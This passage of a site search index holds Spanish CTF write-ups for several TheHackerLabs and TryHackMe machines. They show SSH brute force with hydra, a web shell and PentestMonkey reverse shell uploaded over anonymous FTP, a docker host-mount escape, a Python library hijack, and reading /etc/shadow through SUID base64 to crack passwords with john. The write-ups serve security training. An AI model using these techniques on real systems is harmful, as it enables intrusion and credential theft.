</p>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Siguiendo las indicaciones encontradas comentadas en el c\u00f3digo, probamos a bruteforcear algun usuario con hydra"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Burteforce superadministrador</p> <pre><code>\u276f hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt 192.168.0.235 ssh\n[DATA] attacking ssh://192.168.0.235:22/\n[22][ssh] host: 192.168.0.235   login: superadministrator   password: princesa\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas   <pre><code>\u276f ssh superadministrator@192.168.0.235\n\nsuperadministrator@thehackerslabs-bocatacalamares:~$ whoami\nsuperadministrator\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<pre><code> sudo -l\n User superadministrator may run the following commands on thehackerslabs-bocatacalamares:\n    (ALL) NOPASSWD: /usr/bin/find\n</code></pre> <p>Buscamos binario en GTObins </p> <pre><code>./find . -exec /bin/sh -p \\; -quit\n</code></pre> <p>Explotamos</p> <pre><code>superadministrator@thehackerslabs-bocatacalamares:/usr/bin$ sudo ./find . -exec /bin/sh -p \\; -quit\n# whoami\nroot\n# \n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/","title":"CanHackMe","text":"<p>\ud83e\udde0 Plataforma: HackersLabs</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 9 de febrero de 2025 17:07</p> <p>\ud83c\udf10 IP: <code>192.168.0.137</code></p>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificaci\u00f3n del sistema</p> <pre><code>sudo arp-scan -I eth0 --localnet\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:c6:24:65, IPv4: 192.168.0.246\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.0.1 02:10:18:37:9b:14   (Unknown: locally administered)\n192.168.0.91    a0:88:69:69:7d:2d   Intel Corporate\n192.168.0.110   24:2f:d0:54:73:f6   (Unknown)\n192.168.0.202   fc:8f:90:a5:1d:14   Samsung Electronics Co.,Ltd\n192.168.0.137   00:0c:29:88:50:b6   VMware, Inc.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 3.230 seconds (79.26 hosts/sec). 5 responded\n\u276f whichSystem.py 192.168.0.137\n\n    192.168.0.137 (ttl -&gt; 64): Linux\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.137 -oG targeted\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 00:0C:29:88:50:B6 (VMware)\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p22,80 -sCV 192.1638.0.137 -oN targeted\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 a8:da:3d:7d:c8:cd:c7:69:ce:ed:13:fa:de:b9:96:50 (ECDSA)\n|_  256 03:24:b9:cc:0b:c2:15:09:db:73:9b:b5:24:d5:41:ca (ED25519)\n80/tcp open  http    Apache httpd 2.4.58\n|_http-title: Did not follow redirect to http://canyouhackme.thl\n|_http-server-header: Apache/2.4.58 (Ubuntu)\nMAC Address: 00:0C:29:88:50:B6 (VMware)\nService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5</li> <li>80/tcp open  http    Apache httpd 2.4.58</li> </ul> </li> <li> <p>ENUMERACI\u00d3N WEB</p> <p></p> <p>A\u00f1adimos host</p> <pre><code>sudo nano /etc/hosts\n192.168.0.137   canyouhackme.thl\n</code></pre> </li> </ul> <p></p> <p>Revisamos el codigo fuente:</p> <pre><code>&lt;script&gt;\n        const canvas = document.getElementById('matrix');\n        const ctx = canvas.getContext('2d');\n        canvas.width = window.innerWidth;\n        canvas.height = window.innerHeight;\n/* Hola juan, te he dejado un correo importate, cundo puedas, leelo */\n        const fontSize = 16;\n        const columns = Math.floor(canvas.width / fontSize);\n        const drops = Array(columns).fill(0);\n        const matrixChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789@#$%^&amp;*(),;.:-_'?\u00a1\u00bf!\\\"\";\n\n        function drawMatrix() {\n            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';\n            ctx.fillRect(0, 0, canvas.width, canvas.height);\n\n            ctx.fillStyle = '#00ff00';\n            ctx.font = `${fontSize}px Courier`;\n\n            for (let i = 0; i &lt; drops.length; i++) {\n                const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];\n                ctx.fillText(text, i * fontSize, drops[i] * fontSize);\n\n                if (drops[i] * fontSize &gt; canvas.height &amp;&amp; Math.random() &gt; 0.975) {\n                    drops[i] = 0;\n                }\n\n                drops[i]++;\n            }\n        }\n\n        setInterval(drawMatrix, 50);\n\n        window.addEventListener('resize', () =&gt; {\n            canvas.width = window.innerWidth;\n            canvas.height = window.innerHeight;\n            drops.fill(0);\n        });\n    &lt;/script&gt;\n</code></pre> <p>Aparece usuario \u201cJuan\u201d</p> <p>Mientras revisamos el resto de la web, dejamos buscando con hydra si hay algun password para este usuario</p> <pre><code>\u276f hydra -t16 -l Juan -P /usr/share/wordlists/rockyou.txt 192.168.0.137 ssh\n\n[STATUS] 40.27 tries/min, 604 tries in 00:15h, 14343799 to do in 5937:01h, 12 active\n[22][ssh] host: 192.168.0.137   login: juan   password: matrix\n1 of 1 target successfully completed, 1 valid password found\n</code></pre> <p>Enontramos e password: matrix</p>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Accedemos con el usuario y password encontrados</p> <pre><code>ssh juan@192.168.0.137 \nUser flag: 44053-----\njuan@TheHackersLabs-CanYouHackMe:~$ \n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<p>Vemos que en el home de Juan, hay la carpeta docker. </p> <p>Procedemos a listar las imagenes docker</p> <pre><code>juan@TheHackersLabs-CanYouHackMe:~/snap$ docker images\nREPOSITORY   TAG       IMAGE ID       CREATED        SIZE\nalpine       latest    91ef0af61f39   5 months ago   7.8MB\n</code></pre> <p>Ahora vemos con que privilegios se est\u00e1 ejecutando:</p> <pre><code>juan@TheHackersLabs-CanYouHackMe:~/snap$ docker run --rm -it alpine sh -c \"whoami\"\nroot\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Ahora provamos a spawnear una shell como root</p> <pre><code> juan@TheHackersLabs-CanYouHackMe:~/snap$ docker run --rm -it alpine sh\n/ # whoami\nroot\n/ # ls\nbin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var\n</code></pre> <p>Listamos y vemos que estamos dentro del contenedor y no en el host pricipal. Al tener permisos de root dentro del contenedor vemos que podemos escalar privilegios co (GTFObins)</p> <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt bash\n\ndocker run: Lanza un nuevo contenedor basado en una imagen de Docker.\n\n-v /:/mnt: Monta el sistema de archivos ra\u00edz del host (/) dentro del contenedor en el directorio /mnt. Esto permite al contenedor acceder al sistema de archivos del host.\n\n--rm: Elimina autom\u00e1ticamente el contenedor cuando finaliza su ejecuci\u00f3n, limpiando los recursos usados.\n\n-it: Ejecuta el contenedor de manera interactiva (-i mantiene el flujo de entrada abierto, y -t asigna una pseudo-terminal).\n\nalpine: Usa la imagen ligera de Alpine Linux para crear el contenedor.\n\nchroot /mnt: Cambia la ra\u00edz del sistema de archivos dentro del contenedor al directorio /mnt, que est\u00e1 montado en el sistema de archivos del host.\n\nbash: Inicia el shell bash dentro del nuevo entorno del contenedor.\n\nEn pocas palabras, este comando monta el sistema de archivos del host dentro de un contenedor de Alpine y cambia el entorno ra\u00edz del contenedor a ese sistema de archivos, permitiendo ejecutar el shell bash con acceso al host.\n</code></pre> <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# whoami\nroot\n# ls\nbin  boot  dev  etc  home  host  lib  lib32  lib64  libx32  media  meta  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  writable\n# cd root\n# ls\nroot.txt  snap\nroot@76bc47806862:~# cat root.txt \n233----\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CanHackMe/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil en la que veo por primera vez tema de contenedores de docker"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/","title":"CyberPunk","text":"<p>Plataforma: HackersLabs OS: Linux Level: Easy Status: Done Complete: Yes Created time: 9 de marzo de 2025 15:28 IP: 192.168.0.78</p>"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificaci\u00f3n del sistema:</p> <pre><code>sudo arp-scan -I eth0 --localnet\n\nStarting arp-scan 1.10.0 with 256 hosts (&lt;https://github.com/royhills/arp-scan&gt;)\n192.168.0.1 02:10:18:37:9b:14   (Unknown: locally administered)\n192.168.0.91    a0:88:69:69:7d:2d   (Unknown)\n192.168.0.78    00:0c:29:0e:c0:4e   (Unknown)\n192.168.0.110   24:2f:d0:54:73:f6   (Unknown)\n192.168.0.202   fc:8f:90:a5:1d:14   (Unknown)\n</code></pre> <p>Localizamos como posible m\u00e1quina victima: <code>192.168.0.78</code></p> <p>Identificamos SO:</p> <pre><code>whichSystem.py 192.168.0.78\n\n192.168.0.91 (ttl -&gt; 64): Linux\n</code></pre> <p>Escaneo 1 nmap</p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.78 -oG allports\n\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 64\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 00:0C:29:0E:C0:4E (VMware)\n</code></pre> <p>Escaneo 2 nmap</p> <pre><code>sudo nmap -p21,22,80 -sCV 192.168.0.78 -oN targeted\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxr-xr-x   2 0        0            4096 May  1  2024 images\n| -rw-r--r--   1 0        0             713 May  1  2024 index.html\n|_-rw-r--r--   1 0        0             923 May  1  2024 secret.txt\n| fingerprint-strings:\n|   GenericLines:\n|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]\n|     Orden incorrecta: Intenta ser m\n|     creativo\n|     Orden incorrecta: Intenta ser m\n|     creativo\n|   Help:\n|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]\n|     214-Se reconocen las siguiente\n|     rdenes (* =&gt;'s' no implementadas):\n|     XCWD CDUP XCUP SMNT* QUIT PORT PASV\n|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD\n|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP\n|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF*\n|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR\n|     STOR STOU APPE REST ABOR RANG USER PASS\n|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST\n|     comentario a root@Cyberpunk\n|   NULL, SMBProgNeg, SSLSessionReq:\n|_    220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.0.78]\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey:\n|   256 6d:b5:c8:65:8d:1f:8a:98:76:93:26:27:df:29:72:4a (ECDSA)\n|_  256 a5:83:2a:8f:eb:c6:f1:0b:e0:e6:d8:e1:05:3b:4c:a5 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-title: Arasaka\n|_http-server-header: Apache/2.4.59 (Debian)\n</code></pre> <p>Vemos que tiene el FTP abierto</p> <p>Probamos a acceder com <code>anonymous</code> al FTP</p> <pre><code>ftp anonymous@192.168.0.78\nftp&gt; ls\n229 Entering Extended Passive Mode (|||17630|)\n150 Abriendo conexi\u00f3n de datos en modo ASCII para file list\ndrwxr-xr-x   2 0        0            4096 May  1  2024 images\n-rw-r--r--   1 0        0             713 May  1  2024 index.html\n-rw-r--r--   1 0        0             923 May  1  2024 secret.txt\n\nftp&gt; get secret.txt\nlocal: secret.txt remote: secret.txt\n229 Entering Extended Passive Mode (|||1652|)\n150 Opening BINARY mode data connection for secret.txt (923 bytes)\n100% |*********************************************************************************************************************************************|   923        2.29 MiB/s    00:00 ETA\n226 Transferencia completada\n</code></pre> <p>Descargamos el archivo <code>secret.txt</code></p> <pre><code>cat secret.txt\nFile: secret.txt\n\n   1   \u2502 *********************************************\n   2   \u2502 *                                           *\n   3   \u2502 *        Hola Netrunner,                   *\n   4   \u2502 *                                           *\n   5   \u2502 *   Has sido contratado por el mejor fixer  *\n   6   \u2502 *   de la ciudad para llevar a cabo una     *\n   7   \u2502 *   misi\u00f3n crucial.                         *\n   8   \u2502 *                                           *\n   9   \u2502 *   Tenemos informaci\u00f3n de que Arasaka,     *\n  10   \u2502 *   la mega-corporaci\u00f3n m\u00e1s poderosa de     *\n  11   \u2502 *   Night City, est\u00e1 migrando sus sistemas  *\n  12   \u2502 *   y actualmente parece ser vulnerable.    *\n  13   \u2502 *   Necesitamos que te infiltres en sus    *\n  14   \u2502 *   sistemas y desactives el Relic para     *\n  15   \u2502 *   salvar la vida de V.                    *\n  16   \u2502 *                                           *\n  17   \u2502 *   Te espero en Apache.                    *\n  18   \u2502 *                                           *\n  19   \u2502 *                         - Alt             *\n  20   \u2502 *********************************************\n</code></pre> <p>Seguimos con fuzzing web</p> <pre><code>gobuster dir -u &lt;http://192.168.0.78&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt\n\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 277]\n/images               (Status: 301) [Size: 313] [--&gt; &lt;http://192.168.0.78/images/&gt;]\n/secret.txt           (Status: 200) [Size: 923]\n/.php                 (Status: 403) [Size: 277]\n/server-status        (Status: 403) [Size: 277]\nProgress: 661677 / 661680 (100.00%)\n</code></pre> <p>No encontramos nada. Siguiendo la pista que nos tiran, probamos a buscar vulnerabilidades en la versi\u00f3n de Apache 2.4.59</p>"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de vulnerabilidades","text":"<p>Apache 2.4.59</p> <pre><code>searchsploit Apache 2.4.59\nExploit Title\nApache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution                                                                                        | php/remote/29290.c\nApache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execution + Scanner                                                                                      | php/remote/29316.py\n</code></pre> <p>Al ver que no hay nada vamos a probar otro m\u00e9todo. Ya que haciendo fuzzing hemos visto que se muestra el mismo fichero que hab\u00eda alojado en el FTP, vamos a probar a subir un archivo para comprobar si podemos acceder</p> <pre><code>ftp anonymous@192.168.0.78\nftp&gt; put cmd_Search.php\n</code></pre> <p></p> <p>Vemos que accedermos correctamente. Accedemos al fichero <code>/etc/passwd</code> y enumeramos usuarios:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\nsync:x:4:65534:sync:/bin:/bin/sync\narasaka:x:1000:1000:arasaka,,,:/home/arasaka:/bin/bash\n</code></pre> <p>Con hydra probamos a bruteforcear con el usuario <code>arasaka</code>, ya que hemos visto que tenia el puerot 22 abierto.</p> <pre><code>hydra -l arasaka -P /usr/share/wordlist/rockyou.txt 192.168.0.78 ssh\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/#_1","title":"CyberPunk","text":"<p>Al parecer, transcurido un tiempo, no encontramos password. Probamos a entrar subiendo directamente una rever shell (PentestMonkey) con el m\u00e9todo anterior, al FTP y accedemos a</p> <p><code>http://192.168.0.78/shell.php</code></p> <p>Ganamos acceso y hacemos tratamiento de la TTY</p> <pre><code>nc -nlvp\nlistening on [any] 4444 ...\nconnect to [192.168.0.176] from (UNKNOWN) [192.168.0.78] 48614\nLinux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux\n 18:16:49 up  1:21,  0 user,  load average: 1.46, 0.97, 0.54\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nsh: 0: cant access tty; job control turned off\n$ script -c bash /dev/null\nScript started, output log file is '/dev/null'.\nwww-data@Cyberpunk:/$ ^Z\n[1]  + 84352 suspended  nc -lvnp 4444\n\u276f stty raw -echo; fg\n[1]  + 84352 continued  nc -lvnp 4444\n                                     resert xterm\nbash: resert: command not found\nwww-data@Cyberpunk:/$\nwww-data@Cyberpunk:/$ stty rows 24 cols 185\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/CyberPunk/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Probamos varias maeras de escalar privilegos</p> <p>Sudo</p> <pre><code>www-data@Cyberpunk:/etc$ sudo -l\n[sudo] password for www-data:\n</code></pre> <p>Buscamos archivos SUID</p> <pre><code>find / -perm -u=s -type f 2/dev/null\n/usr/bin/umount\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n</code></pre> <p>No encontramos nada \u00fatil Vamos a enumerar privilegios con linepeas Subimos el archivo mediante el ftp y accedemos a el por la revershell</p> <p>En el log , encontramos algo interesante:</p> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Unexpected in /opt (usually empty)\ntotal 12\ndrwxr-xr-x  2 root root 4096 May  1  2024 .\ndrwxr-xr-x 18 root root 4096 May  1  2024 ..\n-rwxrwxrwx  1 root root  201 May  1  2024 arasaka.txt\n</code></pre> <p>Accedemos al archivo</p> <pre><code>www-data@Cyberpunk:/opt$ cat arasaka.txt\n++++++++++[&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++&gt;+++++&gt;++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;-.&gt;+.&gt;--.&gt;+.&gt;++++.&gt;++.&gt;---.&gt;.&gt;---.&gt;.&gt;--.&gt;-----..\n</code></pre> <p>Se trata de un tipo de c\u00f3digo llamado BrainFuck. Decodificamos el c\u00f3digo con la web : <code>https://www.dcode.fr/brainfuck-language</code> da como resultado: <code>c------77</code> Comprobamos si ese es el password del usuario arasaka</p> <pre><code>www-data@Cyberpunk:/opt$ su arasaka\nPassword:\narasaka@Cyberpunk:/opt$\narasaka@Cyberpunk:/opt$ cd /home\narasaka@Cyberpunk:/home$ cd arasaka/\narasaka@Cyberpunk:~$ ls\nrandombase64.py  user.txt\narasaka@Cyberpunk:~$ cat user.txt\n</code></pre> <p>Ahora que somos el usuario arasaka miramos como podemos escalar privilegios a root:</p> <pre><code>arasaka@Cyberpunk:~$ sudo -l\nMatching Defaults entries for arasaka on Cyberpunk:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin, use_pty\n\nUser arasaka may run the following commands on Cyberpunk:\n    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py\n</code></pre> <p>Vemos que tenemos permisos para ejecutar como root el script randombase64.py</p> <pre><code>arasaka@Cyberpunk:~$ cat randombase64.py\nimport base64\nmessage = input(\"Enter your string\")\nmessage_bytes = message.encode(\"ascii\")\nbase64_bytes = base64.b64encode(message_bytes)\nbase64_message = base64_bytes.decode(\"ascii\")\n\nprint(base64_message)\n</code></pre> <p>Al tener permisos de root sobre el script y ver que importa librerias, vamos a escalar privilegios creando un script con el nombre de la libreria importada, para que se ejecute antes que el resto del script. En este caso <code>base64.py</code></p> <pre><code>arasaka@Cyberpunk:~$ vi base64.py\nimport os\n\nos.setuid(0)\nos.system(\"/bin/bash\")\n\narasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py\nroot@Cyberpunk:/home/arasaka# ls\n</code></pre> <p>M\u00e9todo alternativo:</p> <pre><code>import os;\nos.system(\"chmod u+s /bin/bash\")\n\nsudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py\nls -la /bin/bash\nbash -p\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/","title":"Basic Pentesting","text":"<p>\ud83e\udde0 Plataforma: TryHackMe</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 15 de diciembre de 2024 19:15</p> <p>\ud83c\udf10 IP: <code>10.10.132.218</code></p>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#reconocimiento-recon","title":"Reconocimiento (Recon)","text":"<p>Escaneo de Puertos</p> <ul> <li>[ ]  Nmap inicial:</li> </ul> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn &lt;%IP%&gt; -oG targeted\n</code></pre> <p>Puertos Abiertos: [Puertos ]: 22,80,139,445,8009,8080</p> <p></p> <ul> <li>[ ]  Nmap servicios:</li> </ul> <pre><code>sudo nmap -sCV -p1,2,3 &lt;%IP%&gt; -oN nmap\nsudo nmap -v -sV -O --script=\"safe and vuln\" -T4 -n -Pn -p135,445 -oA nmap &lt;%IP%&gt;\n</code></pre> <p></p> <ul> <li>[ ]  Nmap webscan</li> </ul> <pre><code>sudo nmap -p80 --script=http-enum 10.10.132.218 -oN webscan\n</code></pre> <p>Potentially interesting: /development/</p> <ul> <li>[ ]  Enum4linux:</li> </ul> <pre><code>emum4linux -a &lt;IP&gt;\n</code></pre> <p>User: kay User: jan</p>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de Vulnerabilidades","text":"<p>Vulnerabilidad Potencial:</p> <p>/developer/</p> <p></p> <p>Vulnerabilidad Potencial: Probamos con hydra a los usuarios kay y jan</p> <pre><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.132.218 ssh\n</code></pre> <p></p> <p>User: jan Pass: armando</p> <p>Conectamos por SSH</p>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#explotacion-exploit","title":"Explotaci\u00f3n (Exploit)","text":"<p>Ejecuci\u00f3n del Exploit</p> <ul> <li> <p>Exploit Utilizado:</p> <pre><code>enum4linux -a IP\n</code></pre> </li> </ul> <p>Resultados**:  Usuarios con los que probar fuerza bruta</p>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#escalada-de-privilegios","title":"Escalada de Privilegios","text":"<ul> <li> <p>Enumeraci\u00f3n de Privilegios:</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> </li> </ul> <p></p> <ul> <li>M\u00e9todo de Escalada: Editamos un fichero privilegiado con un binario SUID</li> </ul> <pre><code>    /usr/bin/vim.basic\n    /usr/bin/vim.basic /etc/sudoers    \n</code></pre> <p></p> <pre><code>sudo su\nroot\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#post-explotacion","title":"Post-Explotaci\u00f3n","text":"<p>Obtenci\u00f3n de User.txt</p> <ul> <li>Localizaci\u00f3n: Obtenido con hydra</li> <li>Contenido :<ul> <li>User: jan</li> <li>Pass: Armando</li> </ul> </li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Basic%20Pentesting/#42-obtencion-de-roottxt","title":"4.2 Obtenci\u00f3n de Root.txt","text":"<ul> <li> <p>Localizaci\u00f3n:</p> <pre><code>/home/kay/pass.bak\n</code></pre> </li> <li> <p>Contenido:</p> <pre><code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Capstone%20%28Privesc%29/","title":"Capstone (Privesc)","text":"<p>Plataforma: TryHackMe OS: Linux Level: Easy Status: Done Complete: Yes Created time: 4 de diciembre de 2024 21:34</p>"},{"location":"Writeup-ctfs/Tryhackme/Capstone%20%28Privesc%29/#notas","title":"Notas","text":"<p>Maquina dedicada \u00fanicamente a la escalada de privilegios</p> <p>You can access the target machine over your browser or use the\u00a0SSH\u00a0credentials below.</p> <ul> <li>Username: leonard</li> <li>Password: Penny123</li> </ul>"},{"location":"Writeup-ctfs/Tryhackme/Capstone%20%28Privesc%29/#explotacion","title":"Explotaci\u00f3n","text":"<pre><code>sudo -l\nSorry, user leonard may not run sudo on ip-10-10-194-26\n</code></pre> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n\nOutput:\n\n/usr/bin/base64 &lt;--\n/usr/bin/ksu\n/usr/bin/fusermount\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chage\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/Xorg\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/crontab\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/sudo\n/usr/sbin/pam_timestamp_check\n</code></pre> <pre><code>\"SUID Base64\"\n\nLFILE=\"/etc/shadow\"\nbase64 \"$LFILE\" | base64 --decode\n\ncat /etc/paswd\n\nAttacker Machine\n\nunshadow passwd shadow &gt; credentials.txt\njohn credentials.txt\n\nProceeding with wordlist:/usr/share/john/password.lst\nPassword1        (missy)\n\nUsername: missy\nPassword: Password1\n</code></pre> <pre><code>su missy\nmissy$:\n</code></pre> <p>Una vez migrados a missy, seguimos buscando binarios</p> <pre><code>sudo -l\n (ALL) NOPASSWD: /usr/bin/find\n\n\"Sudo exploit (gtfobins)\"\n\nsudo find . -exec /bin/sh \\\\; -quit\n\nExplotaci\u00f3n posterior\n</code></pre>"},{"location":"Writeup-ctfs/Tryhackme/Capstone%20%28Privesc%29/#conclusion","title":"Conclusi\u00f3n","text":""},{"location":"Writeup-ctfs/Tryhackme/ColdBox/","title":"ColdBox","text":"<p>\ud83e\udde0 Plataforma: TryHackMe</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 30 de diciembre de 2024 15:45</p> <p>\ud83c\udf10 IP: <code>10.10.134.48</code></p>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Enumeraci\u00f3n inicial"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.134.48 -oG allports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Tryhackme/ColdBox/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior 